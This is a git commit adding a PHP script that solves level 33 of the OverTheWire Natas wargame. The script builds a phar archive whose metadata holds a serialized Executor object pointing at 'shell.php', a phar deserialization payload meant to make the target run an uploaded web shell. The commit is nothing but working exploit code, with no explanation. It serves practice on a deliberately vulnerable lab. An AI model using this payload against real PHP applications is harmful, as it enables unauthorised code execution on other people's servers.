e4f2d2c94572937a75267beac5c68d56b2b76024
anthony <contact@achao.io>
2025-08-11 19:50:48 -0700

    natas 33->34 (2)

---
+++ natas/scripts/natas33.php
@@ -0,0 +1,20 @@
+<!-- https://learnhacking.io/overthewire-natas-level-33-walkthrough/ -->
+<?php
+
+class Executor{
+    private $filename = "shell.php";
+    private $signature = True;
+    private $init = false;
+}
+
+$phar = new Phar('natas.phar');
+$phar->startBuffering();
+$phar->addFromString('test.txt', 'text');
+$phar->setStub('<?php __HALT_COMPILER(); ? >');
+
+$object = new Executor();
+$object->data = 'rips';
+$phar->setMetadata($object);
+$phar->stopBuffering();
+
+?>
